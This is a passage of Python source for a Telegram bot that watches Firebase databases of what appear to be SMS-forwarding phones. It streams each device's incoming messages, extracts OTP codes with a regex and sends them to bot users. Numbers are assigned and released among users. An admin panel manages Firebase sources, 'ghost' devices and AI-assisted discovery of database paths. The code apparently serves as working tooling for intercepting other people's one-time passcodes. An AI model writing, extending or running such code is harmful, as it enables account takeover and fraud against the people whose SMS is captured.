            except: pass

    sms_queue = asyncio.Queue()

    # ── Full multi-path SSE fan-out ─────────────────────────────────────────
    # Firebase apps use 7+ different structures. We listen on ALL candidate paths
    # simultaneously so SMS arrives regardless of which structure is in use.
    def _all_sms_paths() -> list[str]:
        _base = (num["fb_source"] or "").replace(".json", "").rstrip("/")
        _dev  = num["device_id"]
        seen: list[str] = []
        def _add(p: str):
            p = p.rstrip("/")
            if p and p not in seen:
                seen.append(p)
        _add(num["sms_path"] or "")      # primary cached path (highest priority)
        if _base and _dev:
            _add(f"{_base}/sms_forward/{_dev}")   # Pattern G — most common fallback
            _add(f"{_base}/user_sms/{_dev}")       # Pattern F
            _add(f"{_base}/sms/{_dev}")            # Pattern H
            _add(f"{_base}/messages/{_dev}")       # Pattern Y
            _add(f"{_base}/All_Users/sms/{_dev}")  # Pattern Z
            _add(f"{_base}/{_dev}/sms")            # Pattern B
        if not seen:
            seen.append("")              # empty → _sse_listener will auto-discover
        return seen

    def _launch_sse_fanout() -> list[str]:
        keys: list[str] = []
        for _i, _p in enumerate(_all_sms_paths()):
            _k = uid if _i == 0 else f"{uid}_p{_i}"
            sse_tasks[_k] = asyncio.create_task(
                _sse_listener(_p, num["device_id"],
                              num["fb_source"] or "", api_key, sms_queue, uid))
            keys.append(_k)
        sse_last_event[num["device_id"]] = asyncio.get_event_loop().time()
        return keys

    _sse_path_keys: list[str] = _launch_sse_fanout()
    sse_task = sse_tasks.get(uid)        # keep alias for sse_tasks[uid] reference

    was_offline      = False
    poll_counter     = 0
    POLL_INTERVAL    = 2.0
    SSE_DRAIN_MS     = 0.5
    WATCHDOG_SECS    = int(db.get("watchdog_stale_secs") or 45)
    # Record when THIS session started so we can ignore pre-existing SMS that
    # Firebase or the poll fallback might surface during the first few seconds.
    monitor_start_ts = int(datetime.now().timestamp())

    def _process_entry(entry, eid):
        ck = f"{num['device_id']}:{num['fb_source']}"
        if last_sms_seen.get(ck) == eid: return None
        last_sms_seen[ck] = eid
        msg_text, sender, ts = _norm_sms(entry)
        if not msg_text: return None
        fp = _sms_fingerprint(num["number"], sender, msg_text, ts)
        if _is_duplicate(fp): return None
        otp = re.search(r'\b(\d{4,8})\b', msg_text)
        return {"otp": otp.group(1) if otp else None, "sender": sender,
                "message": msg_text, "time": ts, "number": num["number"]}

    # FIX: start at current time so the poll doesn't fire on the very first
    # iteration (which would fetch the last-seen SMS before any new one arrives
    # and mistakenly broadcast it as "NEW OTP").
    last_poll_time    = asyncio.get_event_loop().time()
    path_autocorrect_done = False   # only run path discovery once per session

    while active_sessions.get(uid):
        try:
            sse_delivered = False
            try:
                entry, eid = await asyncio.wait_for(sms_queue.get(), timeout=SSE_DRAIN_MS)
                sse_last_event[num["device_id"]] = asyncio.get_event_loop().time()
                sms = _process_entry(entry, eid)
                if sms:
                    # Belt-and-suspenders: skip SMS that pre-dates this monitoring session.
                    # The SSE seen_keys filter handles most cases, but timing edge-cases
                    # (reconnects, dual-path replay) can still surface old messages.
                    _sms_ts = _parse_sms_time_ts(sms.get("time", ""))
                    if _sms_ts and _sms_ts < monitor_start_ts - 30:
                        log.info("[Monitor] Skipping pre-session SSE SMS (%s < %s)",
                                 _sms_ts, monitor_start_ts)
                    else:
                        cat = _sms_category(sms["message"])
                        with db.cx() as cx:
                            cx.execute("INSERT INTO sms_log VALUES(NULL,?,?,?,?,?,?,?)",
                                (sms["number"], sms["sender"], sms.get("otp","N/A"),
                                 sms["message"], sms["time"],
                                 num["fb_source"], cat))
                            cx.execute("UPDATE numbers SET last_sms_ts=? WHERE id=?",
                                       (int(datetime.now().timestamp()), nid))
                            # SMS received → clear dead reports, restore to Hot tier
                            cx.execute("DELETE FROM number_reports WHERE number_id=?", (nid,))
                            cx.execute("UPDATE numbers SET report_count=0 WHERE id=?", (nid,))
                        await call.message.answer(fmt_otp(sms))
                        sse_delivered = True
                        # Watchlist check
                        asyncio.ensure_future(_check_watchlist(
                            sms["number"], sms["sender"], sms["message"], sms.get("otp","")))
                while True:
                    try:
                        entry2, eid2 = sms_queue.get_nowait()
                        sse_last_event[num["device_id"]] = asyncio.get_event_loop().time()
                        sms2 = _process_entry(entry2, eid2)
                        if sms2:
                            _sms_ts2 = _parse_sms_time_ts(sms2.get("time", ""))
                            if _sms_ts2 and _sms_ts2 < monitor_start_ts - 30:
                                pass  # pre-session — skip
                            else:
                                cat2 = _sms_category(sms2["message"])
                                with db.cx() as cx:
                                    cx.execute("INSERT INTO sms_log VALUES(NULL,?,?,?,?,?,?,?)",
                                        (sms2["number"], sms2["sender"], sms2.get("otp","N/A"),
                                         sms2["message"], sms2["time"], num["fb_source"], cat2))
                                await call.message.answer(fmt_otp(sms2))
                                sse_delivered = True
                    except asyncio.QueueEmpty:
                        break
            except asyncio.TimeoutError:
                pass

            if uid not in active_sessions: break
            poll_counter += 1

            # SSE Watchdog: restart if stale (check every 20 loops = ~10s @ 0.5s drain)
            if poll_counter % 20 == 0:
                last_ev = sse_last_event.get(num["device_id"], 0)
                if asyncio.get_event_loop().time() - last_ev > WATCHDOG_SECS:
                    log.info("[Watchdog] SSE stale for %s — restarting all %d paths…",
                             num["device_id"], len(_sse_path_keys))
                    for _wk in _sse_path_keys:
                        _wt = sse_tasks.pop(_wk, None)
                        if _wt: _wt.cancel()
                    sms_queue = asyncio.Queue()

                    # ── Path Auto-Correction ───────────────────────────────
                    # On the FIRST stale event, re-discover the correct path.
                    # _discover_sms_path saves the result to DB automatically.
                    if not path_autocorrect_done:
                        path_autocorrect_done = True
                        log.info("[PathAutoCorrect] Re-discovering path for %s…", num["device_id"])
                        new_path = await _discover_sms_path(
                            num["device_id"], num["fb_source"] or "", api_key)
                        if new_path and new_path != (num["sms_path"] or ""):
                            old_path = num["sms_path"] or "(none)"
                            num = dict(num)   # make mutable
                            num["sms_path"] = new_path
                            log.info("[PathAutoCorrect] Corrected %s → %s", old_path, new_path)
                            try:
                                short = new_path.split("/")[-2] + "/" + new_path.split("/")[-1]
                                await call.message.answer(
                                    f"🔧 <b>Path auto-corrected</b>\n"
                                    f"<code>{short}</code>\n"
                                    f"<i>Resuming SMS monitoring…</i>")
                            except Exception:
                                pass
                    # ──────────────────────────────────────────────────────

                    _sse_path_keys[:] = _launch_sse_fanout()
                    sse_task = sse_tasks.get(uid)

            # Online check every ~45 s
            if poll_counter % 30 == 0:
                online = await dev_online(num["device_id"], num["fb_source"], num["status_path"])
                # FIX: online=None means unknown — don't treat as offline, just skip
                if online is False and not was_offline:
                    was_offline = True
                    try:
                        await call.message.answer(
                            f"⚠️ <b>Device Offline</b>\n📞 <code>{nd}</code>\n"
                            f"<i>Waiting to come back online…</i>")
                        await mmsg.edit_text(
                            f"⚠️ <b>Device Offline</b>\n📞 <code>{nd}</code>",
                            reply_markup=kb)
                    except: pass
                elif online is True and was_offline:
                    was_offline = False
                    try:
                        await call.message.answer(f"✅ <b>Device Back Online!</b> Resuming.\n📞 <code>{nd}</code>")
                        await mmsg.edit_text(_make_text(nd, carrier), reply_markup=kb)
                    except: pass
                # online is None → status unknown → leave was_offline unchanged, keep monitoring

            if was_offline:
                await asyncio.sleep(3); continue

            now = asyncio.get_event_loop().time()
            if not sse_delivered and (now - last_poll_time) >= POLL_INTERVAL:
                last_poll_time = now
                sms = await fetch_sms(num["number"], num["device_id"],
                                      num["fb_source"], num["sms_path"])
                if sms:
                    # Guard 1: skip any SMS that predates this monitoring session.
                    # The poll fetches "most recent" from Firebase, which may be an OLD
                    # SMS that was sitting there before the user clicked Monitor.
                    _poll_sms_ts = _parse_sms_time_ts(sms.get("time", ""))
                    _is_pre_session = (
                        _poll_sms_ts > 0 and _poll_sms_ts < monitor_start_ts - 30
                    )
                    # Guard 2: dedup — same fingerprint logic as the SSE path.
                    _poll_fp = _sms_fingerprint(
                        sms.get("number",""), sms.get("sender",""),
                        sms.get("message",""), sms.get("time",""))
                    _is_dup = _is_duplicate(_poll_fp)

                    if not _is_pre_session and not _is_dup:
                        cat = _sms_category(sms["message"])
                        with db.cx() as cx:
                            cx.execute("INSERT INTO sms_log VALUES(NULL,?,?,?,?,?,?,?)",
                                (sms["number"], sms["sender"], sms.get("otp","N/A"),
                                 sms["message"], sms["time"], num["fb_source"], cat))
                            # Poll SMS received → also clear dead reports, restore to Hot tier
                            cx.execute("DELETE FROM number_reports WHERE number_id=?", (nid,))
                            cx.execute("UPDATE numbers SET report_count=0, last_sms_ts=? WHERE id=?",
                                       (int(datetime.now().timestamp()), nid))
                        await call.message.answer(fmt_otp(sms))
                        asyncio.ensure_future(_check_watchlist(
                            sms["number"], sms["sender"], sms["message"], sms.get("otp","")))

        except asyncio.CancelledError:
            break
        except Exception as e:
            log.warning("Monitor loop uid=%d: %s", uid, e)
            await asyncio.sleep(3)

    for _ck in _sse_path_keys:
        _ct = sse_tasks.pop(_ck, None)
        if _ct:
            _ct.cancel()
    active_sessions.pop(uid, None)


@router.callback_query(F.data.startswith("refresh_mon_"))
async def cb_refresh_mon(call: CallbackQuery):
    nid = int(call.data.split("_")[2])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    api_key = _get_fb_apikey(num["fb_source"])
    entries = await fetch_last_n_sms(num["number"], num["device_id"],
                                     num["fb_source"], num["sms_path"], n=3)
    online, battery, _ = await dev_health(num["device_id"], num["fb_source"], num["status_path"])
    total_sms = db.cx().execute(
        "SELECT COUNT(*) as c FROM sms_log WHERE number=?", (num["number"],)).fetchone()["c"]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅ Back",  callback_data="back_home"),
         InlineKeyboardButton(text="🏠 Home", callback_data="back_home")],
        [InlineKeyboardButton(text="🔄 Refresh Again", callback_data=f"refresh_mon_{nid}"),
         InlineKeyboardButton(text="🔓 Release",       callback_data=f"relnum_{nid}")],
    ])
    await call.message.edit_text(
        fmt_device_detail(dict(num), entries, battery, online, total_sms),
        reply_markup=kb)
    await call.answer("✅ Refreshed!")


@router.callback_query(F.data.startswith("last5_"))
async def cb_last5(call: CallbackQuery):
    nid = int(call.data.split("_")[1])
    num = db.cx().execute("SELECT * FROM numbers WHERE id=?", (nid,)).fetchone()
    if not num: return await call.answer("Not found.", show_alert=True)
    sm = await call.message.answer("📥 <i>Fetching last 5 SMS…</i>")
    entries = await fetch_last_n_sms(num["number"], num["device_id"],
                                     num["fb_source"], num["sms_path"], n=5)
    if not entries:
        return await sm.edit_text("📭 <b>No recent SMS found.</b>")
    text = "╔══════════════════════╗\n  📥 <b>LAST 5 SMS</b>\n╚══════════════════════╝\n\n"
    for i, e in enumerate(entries, 1):
        otp_str = f"  🎯 OTP: <code>{e['otp']}</code>" if e.get("otp") else ""
        text += (f"<b>#{i}</b> 📨 {e['sender']}{otp_str}\n"
                 f"     🕐 {e['time']}\n"
                 f"     💬 <i>{e['message'][:120]}</i>\n\n")
    await sm.edit_text(text)
    await call.answer()


@router.callback_query(F.data.startswith("chgnum_"))
async def cb_chgnum(call: CallbackQuery):
    old = int(call.data.split("_")[1]); uid = call.from_user.id
    if uid in active_sessions: del active_sessions[uid]
    if uid in sse_tasks: sse_tasks[uid].cancel(); del sse_tasks[uid]
    with db.cx() as c: c.execute("UPDATE numbers SET assigned_to=NULL WHERE id=?", (old,))
    nums = db.cx().execute(
        "SELECT * FROM numbers WHERE status='Active' AND is_ghost=0 "
        "AND (assigned_to IS NULL OR assigned_to=?)", (uid,)).fetchall()
    if not nums: return await call.answer("No other Active numbers.", show_alert=True)
    btns = [[InlineKeyboardButton(
        text=f"🔓 {_disp(n['number'])}  [{str(n['device_name'] or '')[:12]}]",
        callback_data=f"mon_{n['id']}")] for n in nums if n["id"] != old]
    btns.append([InlineKeyboardButton(text="🔙 Back", callback_data="back_home")])
    await call.message.edit_text("🔄 <b>Pick a number:</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))


@router.callback_query(F.data.startswith("relnum_"))
async def cb_relnum(call: CallbackQuery):
    nid = int(call.data.split("_")[1]); uid = call.from_user.id
    if uid in active_sessions: del active_sessions[uid]
    if uid in sse_tasks: sse_tasks[uid].cancel(); del sse_tasks[uid]
    with db.cx() as c: c.execute("UPDATE numbers SET assigned_to=NULL WHERE id=?", (nid,))
    await call.message.edit_text(
        "╔══════════════════════╗\n"
        "  🔓 <b>NUMBER RELEASED</b>\n"
        "╚══════════════════════╝\n\n"
        "<i>The number is now free for others.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_home")]]))


# ══════════════════════════════════════════════════════════════
# /admin DASHBOARD
# ══════════════════════════════════════════════════════════════

@router.message(Command("admin"))
async def cmd_admin(msg: Message):
    if msg.from_user.id not in ADMIN_IDS: return
    total   = db.cx().execute("SELECT COUNT(*) as c FROM numbers").fetchone()["c"]
    active  = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Active' AND is_ghost=0").fetchone()["c"]
    offline = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE status='Inactive' AND is_ghost=0").fetchone()["c"]
    ghosts  = db.cx().execute("SELECT COUNT(*) as c FROM numbers WHERE is_ghost=1 OR number LIKE 'DEV-%'").fetchone()["c"]
    srcs    = db.cx().execute("SELECT COUNT(*) as c FROM firebase_sources").fetchone()["c"]
    q_srcs  = db.cx().execute("SELECT COUNT(*) as c FROM firebase_sources WHERE quarantined=1").fetchone()["c"]
    learned = len([f for f in __import__("os").listdir("learned_patterns") if f.endswith(".json")]
                  if __import__("os").path.isdir("learned_patterns") else [])
    sms_today = db.cx().execute(
        "SELECT COUNT(*) as c FROM sms_log WHERE received_at LIKE ?",
        (_now_ist().strftime("%d-%m-%Y") + "%",)).fetchone()["c"]
    fail24 = db.cx().execute(
        "SELECT COUNT(*) as c FROM sms_log WHERE received_at LIKE ? AND otp IS NULL",
        (_now_ist().strftime("%d-%m-%Y") + "%",)).fetchone()["c"]
    km = "ON 🔐" if db.get("key_mode") == "1" else "OFF 🔓"
    g_key   = "✅ Set" if _get_groq_key() else "❌ Not set"
    a_key   = "✅ Set" if _get_anthropic_key() else "❌ Not set"

    await msg.answer(
        f"╔════════════════════════════╗\n"
        f"  🔧 <b>ADMIN CONTROL CENTER</b>\n"
        f"╚════════════════════════════╝\n\n"
        f"╔═ 📊 SYSTEM OVERVIEW ═════╗\n"
        f"  👥 Users      : <b>N/A</b>\n"
        f"  📱 Active     : <b>{active}</b>\n"
        f"  🔴 Offline    : <b>{offline}</b>\n"
        f"  👻 Ghost      : <b>{ghosts}</b>\n"
        f"  📡 Firebase   : <b>{srcs}</b> ({q_srcs} quarantined)\n"
        f"  🧠 Learned    : <b>{learned}</b> patterns\n"
        f"  💬 SMS Today  : <b>{sms_today}</b>\n"
        f"  📡 SSE Streams: <b>{len(sse_tasks)}</b>\n"
        f"╚══════════════════════════╝\n\n"
        f"🔑 Key Mode: <b>{km}</b>\n"
        f"🤖 Groq: {g_key}  |  Claude: {a_key}",
        reply_markup=menu_admin())


# Admin numbers submenu
@router.callback_query(F.data == "adm_numbers")
async def cb_adm_numbers(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    locked_c = db.cx().execute(
        "SELECT COUNT(*) as c FROM numbers WHERE assigned_to IS NOT NULL").fetchone()["c"]
    lock_label = f"🔓 Release All ({locked_c} locked)" if locked_c else "🔓 Release All (none locked)"
    await call.message.edit_text(
        "📱 <b>NUMBER MANAGEMENT</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🟢 Active",      callback_data="num_Active"),
             InlineKeyboardButton(text="🔴 Offline",     callback_data="num_Inactive")],
            [InlineKeyboardButton(text="👻 Ghosts",      callback_data="ghost_list_0"),
             InlineKeyboardButton(text="📊 Live Status", callback_data="adm_report")],
            [InlineKeyboardButton(text="🔍 Rescan",      callback_data="adm_rescan"),
             InlineKeyboardButton(text="📱 Add Manual",  callback_data="adm_addnum")],
            [InlineKeyboardButton(text=lock_label,       callback_data="adm_release_all")],
            [InlineKeyboardButton(text="🔙 Admin",       callback_data="back_admin")],
        ]))
    await call.answer()


# Firebase submenu
@router.callback_query(F.data == "adm_firebase")
async def cb_adm_firebase(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.edit_text("🗄 <b>FIREBASE MANAGEMENT</b>", reply_markup=menu_firebase())
    await call.answer()


# System submenu
@router.callback_query(F.data == "adm_system")
async def cb_adm_system(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.edit_text("⚙ <b>SYSTEM SETTINGS</b>", reply_markup=menu_system())
    await call.answer()


# ══════════════════════════════════════════════════════════════
# AI CENTER  (admin only)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_ai_center")
async def cb_ai_center(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    g_key   = _get_groq_key()
    a_key   = _get_anthropic_key()
    g_model = db.get("groq_model") or "fast"
    learned = 0
    import os
    if os.path.isdir("learned_patterns"):
        learned = len([f for f in os.listdir("learned_patterns") if f.endswith(".json")])
    fail_p  = db.cx().execute("SELECT SUM(failure) as s FROM pattern_stats").fetchone()["s"] or 0
    succ_p  = db.cx().execute("SELECT SUM(success) as s FROM pattern_stats").fetchone()["s"] or 0
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  🤖 <b>AI CENTER</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🤖 <b>Groq:</b> {'✅ ' + g_key[:8] + '…' if g_key else '❌ Not configured'}\n"
        f"🔖 <b>Model:</b> {GROQ_MODELS.get(g_model, g_model)}\n"
        f"🎭 <b>Anthropic:</b> {'✅ Set' if a_key else '❌ Not set'}\n\n"
        f"🧠 <b>Learned Patterns:</b> {learned}\n"
        f"📊 <b>Parse Success:</b> {succ_p}  |  <b>Failures:</b> {fail_p}\n",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚙ AI Config",           callback_data="adm_ai_config")],
            [InlineKeyboardButton(text="🔥 AI Hot Suggest",      callback_data="ai_hot_suggest"),
             InlineKeyboardButton(text="🔍 Deep Scan",           callback_data="deep_scan_menu")],
            [InlineKeyboardButton(text="🗄 Scan DB (AI)",        callback_data="ai_scan_db_select"),
             InlineKeyboardButton(text="👻 Scan Ghosts (AI)",    callback_data="ai_scan_ghosts")],
            [InlineKeyboardButton(text="📊 Pattern Stats",       callback_data="adm_pattern_stats")],
            [InlineKeyboardButton(text="🔙 Admin",               callback_data="back_admin")],
        ]))
    await call.answer()


# ══════════════════════════════════════════════════════════════
# AI CONFIG  (/admin → ⚙ System → 🤖 AI Config)
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_ai_config")
async def cb_ai_config(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    g_key   = _get_groq_key()
    a_key   = _get_anthropic_key()
    g_model = db.get("groq_model") or "fast"
    await call.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  🤖 <b>AI CONFIG</b>\n"
        f"╚══════════════════════╝\n\n"
        f"🤖 <b>Groq API Key:</b>\n"
        f"<code>{'…' + g_key[-8:] if len(g_key) > 8 else ('Not set' if not g_key else g_key)}</code>\n\n"
        f"🔖 <b>Active Model:</b>\n"
        f"<code>{GROQ_MODELS.get(g_model, g_model)}</code>\n\n"
        f"🎭 <b>Anthropic Key:</b>\n"
        f"<code>{'…' + a_key[-8:] if len(a_key) > 8 else ('Not set' if not a_key else a_key)}</code>\n\n"
        f"<i>Groq is primary AI. Anthropic is optional (ghost analysis).</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔑 Set Groq API Key",     callback_data="set_groq_key_prompt")],
            [InlineKeyboardButton(text="⚡ Model: llama-3.3-70b", callback_data="groq_model_fast"),
             InlineKeyboardButton(text="🧠 Model: deepseek-r1",   callback_data="groq_model_deep")],
            [InlineKeyboardButton(text="🏓 Ping AI (test key)",   callback_data="ping_groq_ai")],
            [InlineKeyboardButton(text="🎭 Set Anthropic Key",     callback_data="set_anthropic_prompt")],
            [InlineKeyboardButton(text="🗑 Clear Groq Key",        callback_data="clear_groq_key"),
             InlineKeyboardButton(text="🗑 Clear Anthropic",       callback_data="clear_anthropic_key")],
            [InlineKeyboardButton(text="🔙 System",                callback_data="adm_system")],
        ]))
    await call.answer()


@router.callback_query(F.data == "ping_groq_ai")
async def cb_ping_groq_ai(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.answer("⏳ Pinging Groq AI…")
    groq_key   = _get_groq_key()
    model_name = _get_groq_model()

    if not groq_key:
        return await call.message.answer(
            "❌ <b>No Groq API key set.</b>\n"
            "Use <b>🔑 Set Groq API Key</b> first.")

    payload = {
        "model": model_name,
        "messages": [{"role": "user", "content": "Reply with exactly: pong"}],
        "max_tokens": 16,
        "temperature": 0,
    }

    t0 = asyncio.get_event_loop().time()
    status_code = None
    raw_json    = {}
    error_text  = None

    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.post(
                f"{GROQ_BASE_URL}/chat/completions",
                headers={"Authorization": f"Bearer {groq_key}",
                         "Content-Type": "application/json"},
                json=payload,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                status_code = resp.status
                try:
                    raw_json = await resp.json(content_type=None)
                except Exception:
                    raw_json = {"raw_text": await resp.text()}
    except asyncio.TimeoutError:
        error_text = "Timeout after 15 s"
    except Exception as exc:
        error_text = str(exc)

    elapsed_ms = int((asyncio.get_event_loop().time() - t0) * 1000)

    # Build pretty display
    if error_text:
        status_emoji = "❌"
        reply_text   = error_text
        confidence   = "—"
    elif status_code == 200:
        status_emoji = "✅"
        reply_text   = (raw_json.get("choices", [{}])[0]
                        .get("message", {}).get("content", "?"))
        usage        = raw_json.get("usage", {})
        confidence   = f"{usage.get('completion_tokens',0)} tok"
    else:
        status_emoji = "⚠️"
        reply_text   = raw_json.get("error", {}).get("message", str(raw_json))
        confidence   = "—"

    # Truncate raw JSON so it fits in a message (4096 char limit)
    raw_str = json.dumps(raw_json, indent=2, ensure_ascii=False)
    if len(raw_str) > 2800:
        raw_str = raw_str[:2800] + "\n… (truncated)"

    await call.message.answer(
        f"╔══════════════════════╗\n"
        f"  🏓 <b>AI PING RESULT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{status_emoji} <b>Status:</b> <code>HTTP {status_code or 'ERR'}</code>\n"
        f"⏱ <b>Latency:</b> <code>{elapsed_ms} ms</code>\n"
        f"🤖 <b>Model:</b> <code>{model_name}</code>\n"
        f"💬 <b>Reply:</b> <code>{reply_text}</code>\n"
        f"📊 <b>Tokens:</b> <code>{confidence}</code>\n\n"
        f"📦 <b>Raw JSON:</b>\n"
        f"<pre>{raw_str}</pre>",
        parse_mode="HTML")


@router.callback_query(F.data == "set_groq_key_prompt")
async def cb_set_groq_key_prompt(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer(
        "🔑 <b>Enter your Groq API Key:</b>\n\n"
        "Get it free at: <a href='https://console.groq.com'>console.groq.com</a>\n"
        "<i>Format: gsk_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx</i>\n\n"
        "Send /cancel to abort.")
    await state.set_state(S.set_groq_key); await call.answer()


@router.message(S.set_groq_key)
async def proc_set_groq_key(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if msg.text.strip() == "/cancel":
        await state.clear(); return await msg.answer("❌ Cancelled.")
    key = msg.text.strip()
    if not key.startswith("gsk_") and len(key) < 20:
        return await msg.answer("❌ Invalid Groq key format. Must start with <code>gsk_</code>")
    db.set("groq_api_key", key)
    db.log_action(msg.from_user.id, "Groq Key Set", f"Key ending …{key[-6:]}")
    await state.clear()
    await msg.answer(
        f"✅ <b>Groq API Key Saved!</b>\n\n"
        f"Key: <code>…{key[-8:]}</code>\n"
        f"Model: <code>{GROQ_MODELS.get(db.get('groq_model') or 'fast')}</code>\n\n"
        f"<i>AI structure learning is now active.</i>")


@router.callback_query(F.data.startswith("groq_model_"))
async def cb_groq_model(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    model_slug = call.data.split("groq_model_")[1]
    db.set("groq_model", model_slug)
    model_name = GROQ_MODELS.get(model_slug, model_slug)
    db.log_action(call.from_user.id, "Groq Model Changed", model_name)
    await call.answer(f"✅ Model set to: {model_name}", show_alert=True)


@router.callback_query(F.data == "set_anthropic_prompt")
async def cb_set_anthropic_prompt(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    await call.message.answer(
        "🎭 <b>Enter your Anthropic API Key:</b>\n\n"
        "<i>Used for ghost analysis only. Optional.</i>\n\n"
        "Send /cancel to abort.")
    await state.set_state(S.set_anthropic); await call.answer()


@router.message(S.set_anthropic)
async def proc_set_anthropic(msg: Message, state: FSMContext):
    if msg.from_user.id not in ADMIN_IDS: return
    if msg.text.strip() == "/cancel":
        await state.clear(); return await msg.answer("❌ Cancelled.")
    key = msg.text.strip()
    db.set("anthropic_api_key", key)
    db.log_action(msg.from_user.id, "Anthropic Key Set", f"Key ending …{key[-6:]}")
    await state.clear()
    await msg.answer(f"✅ <b>Anthropic Key Saved!</b>\n<code>…{key[-8:]}</code>")


@router.callback_query(F.data == "clear_groq_key")
async def cb_clear_groq(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("groq_api_key", "")
    db.log_action(call.from_user.id, "Groq Key Cleared", "")
    await call.answer("🗑 Groq key cleared.", show_alert=True)


@router.callback_query(F.data == "clear_anthropic_key")
async def cb_clear_anthropic(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    db.set("anthropic_api_key", "")
    db.log_action(call.from_user.id, "Anthropic Key Cleared", "")
    await call.answer("🗑 Anthropic key cleared.", show_alert=True)


# ══════════════════════════════════════════════════════════════
# FIREBASE HEALTH CENTER
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_fb_health")
async def cb_fb_health(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    srcs = db.cx().execute("SELECT * FROM firebase_sources ORDER BY quarantined DESC, health_level").fetchall()
    if not srcs: return await call.answer("No Firebase sources.", show_alert=True)

    text = "╔══════════════════════╗\n  📡 <b>FIREBASE HEALTH</b>\n╚══════════════════════╝\n\n"
    btns = []
    for s in srcs:
        icon   = _health_icon(s["health_level"] if not s["quarantined"] else "Quarantined")
        level  = "⚠ QUARANTINED" if s["quarantined"] else s["health_level"]
        reason = f"\n     ⚠ {s['quarantine_reason']}" if s.get("quarantine_reason") else ""
        text += (f"{icon} <b>{s['label']}</b> — {level}\n"
                 f"     📱 {s['num_count']} numbers  |  ❌ Fails: {s['fail_count']}\n"
                 f"     🕐 Synced: {s['last_synced']}{reason}\n\n")
        row = []
        if s["quarantined"]:
            row.append(InlineKeyboardButton(text=f"🔄 Retry {s['label'][:10]}",
                                            callback_data=f"fb_retry_{s['id']}"))
        else:
            row.append(InlineKeyboardButton(text=f"🔄 {s['label'][:10]}",
                                            callback_data=f"resync_src_{s['id']}"))
        row.append(InlineKeyboardButton(text="🗑", callback_data=f"del_src_{s['id']}"))
        btns.append(row)

    btns.append([InlineKeyboardButton(text="🔙 Firebase", callback_data="adm_firebase")])
    await call.message.answer(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data.startswith("fb_retry_"))
async def cb_fb_retry(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    sid = int(call.data.split("_")[2])
    src = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (sid,)).fetchone()
    if not src: return await call.answer("Not found.", show_alert=True)
    sm = await call.message.answer(f"🔄 <i>Retrying {src['label']}…</i>")
    n, err, stype = await sync_one(src["url"])
    if err:
        await sm.edit_text(f"❌ {src['label']}: {err}")
    else:
        with db.cx() as c:
            c.execute("UPDATE firebase_sources SET quarantined=0,quarantine_reason=NULL,"
                      "fail_count=0,health_level='Excellent' WHERE id=?", (sid,))
        db.log_action(call.from_user.id, "Firebase Manually Recovered", src["label"])
        await sm.edit_text(f"✅ <b>{src['label']}</b> — Recovered! {n} numbers [{stype}]")
    await call.answer()


# ══════════════════════════════════════════════════════════════
# WATCHLIST
# ══════════════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_watchlist")
async def cb_watchlist(call: CallbackQuery):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
    rows = db.cx().execute("SELECT * FROM watchlist ORDER BY id DESC").fetchall()
    text = "╔══════════════════════╗\n  ⭐ <b>WATCHLIST</b>\n╚══════════════════════╝\n\n"
    if not rows:
        text += "<i>No numbers in watchlist.\nAdmin is notified instantly on any SMS.</i>\n"
    else:
        for r in rows:
            text += (f"⭐ <code>{r['number']}</code>\n"
                     f"   📝 {r['note'] or 'No note'}  |  🕐 {r['added_at']}\n\n")
    btns = [[InlineKeyboardButton(text="➕ Add Number", callback_data="wl_add_manual")]]
    if rows:
        for r in rows[:8]:
            btns.append([InlineKeyboardButton(
                text=f"🗑 {r['number']}",
                callback_data=f"wl_remove_{r['id']}")])
    btns.append([InlineKeyboardButton(text="🔙 System", callback_data="adm_system")])
    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()


@router.callback_query(F.data == "wl_add_manual")
async def cb_wl_add_manual(call: CallbackQuery, state: FSMContext):
    if call.from_user.id not in ADMIN_IDS: return await call.answer()
